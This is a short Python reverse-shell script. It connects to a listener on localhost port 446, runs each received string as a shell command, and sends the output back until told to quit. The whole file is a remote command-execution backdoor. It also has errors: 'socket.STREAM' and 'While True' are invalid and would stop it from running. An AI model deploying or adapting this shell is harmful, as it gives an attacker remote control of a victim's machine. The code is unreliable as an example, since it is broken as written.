#!/usr/bin/python

import subprocess, socket

HOST =  "localhost"
PORT = 446

s = socket.socket(socket.AF_INET, socket.STREAM)

s.connect((HOST, PORT))
s.send("Hello World!")

While True:
	data = s.recv(1024)
	if data == "quit":break
	
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdoutput = proc.stdout.read() + proc.stderr.read()
	
	s.send(stdoutput)
s.send("Bye")
s.close()
